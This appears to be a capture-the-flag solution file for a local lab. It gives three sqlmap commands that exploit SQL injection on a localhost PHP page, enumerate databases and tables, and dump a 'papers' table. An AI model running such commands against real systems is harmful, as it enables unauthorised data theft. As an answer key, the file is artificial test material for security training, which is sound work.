# Solution

## Flag 1: SQL injection

run `sqlmap` on `http://localhost:8000/user.php?name=Alice`

- `sqlmap -u 'http://localhost:8000/user.php?name=Alice' --dbs --level 2`
- `sqlmap -u 'http://localhost:8000/user.php?name=Alice' -D MYSQL_DATABASE --tables`
- `sqlmap -u 'http://localhost:8000/user.php?name=Alice' -D MYSQL_DATABASE -T papers --dump`

